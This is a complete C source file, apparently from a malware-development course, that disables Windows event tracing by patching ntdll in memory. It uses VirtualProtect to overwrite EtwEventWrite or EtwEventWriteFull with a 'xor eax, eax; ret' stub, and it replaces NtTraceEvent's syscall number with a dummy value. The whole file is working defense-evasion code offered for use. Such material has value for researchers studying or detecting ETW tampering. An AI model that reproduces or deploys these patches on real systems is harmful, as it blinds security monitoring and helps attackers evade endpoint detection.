// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>


#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_MOV_INSTRUCTION_OPCODE			0xB8		// 'mov'	- instruction opcode

#define	x64_SYSCALL_STUB_SIZE				0x20		// size of a syscall stub is 32


typedef enum PATCH
{
	PATCH_ETW_EVENTWRITE,
	PATCH_ETW_EVENTWRITE_FULL
};


BOOL PatchEtwWriteFunctionsStart(enum PATCH ePatch) {

	DWORD		dwOldProtection		= 0x00;
	PBYTE		pEtwFuncAddress		= NULL;
	BYTE		pShellcode[3]		= {
		0x33, 0xC0,			// xor eax, eax
		0xC3				// ret
	};


	// Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based of 'ePatch'
	pEtwFuncAddress = GetProcAddress(GetModuleHandleA("NTDLL"), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
	if (!pEtwFuncAddress) {
		printf("[!] GetProcAddress failed with error  %d \n", GetLastError());
		return FALSE;
	}


	printf("\t> Address Of \"%s\" : 0x%p \n", ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull", pEtwFuncAddress);
	printf("\t> Patching with \"33 C0 C3\" ... ");

	// Change memory permissions to RWX
	if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch
	memcpy(pEtwFuncAddress, pShellcode, sizeof(pShellcode));

	// Change memory permissions to original
	if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE ! \n");

	return TRUE;
}


BOOL PatchNtTraceEventSSN() {
	
	DWORD		dwOldProtection = 0x00;
	PBYTE		pNtTraceEvent	= NULL;

	// Get the address of "NtTraceEvent"
	pNtTraceEvent = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "NtTraceEvent");
	if (!pNtTraceEvent)
		return FALSE;

	printf("\t> Address of \"NtTraceEvent\" : 0x%p \n", pNtTraceEvent);

	// Search for NtTraceEvent's SSN pointer
	for (int i = 0; i < x64_SYSCALL_STUB_SIZE; i++){

		if (pNtTraceEvent[i] == x64_MOV_INSTRUCTION_OPCODE) {
			// Set the pointer to NtTraceEvent's SSN and break
			pNtTraceEvent = (PBYTE)(&pNtTraceEvent[i] + 1);	
			break;
		}

		// If we reached the 'ret' or 'syscall' instruction, we fail
		if (pNtTraceEvent[i] == x64_RET_INSTRUCTION_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
			return FALSE;
	}
	
	printf("\t> Position Of NtTraceEvent's SSN : 0x%p \n", pNtTraceEvent);
	printf("\t> Patching with \"FF\" ... ");

	// Change memory permissions to RWX
	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch - Replacing NtTraceEvent's SSN with a dummy one
	// Dummy SSN in reverse order
	*(PDWORD)pNtTraceEvent = 0x000000FF;	

	// Change memory permissions to original
	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE ! \n");

	return TRUE;
}






int main() {

	
	//PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE);
	//PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE_FULL);

	PatchNtTraceEventSSN();
	
	printf("[#] Press <Enter> To Quit ... \n");
	getchar();

	return 0;
}



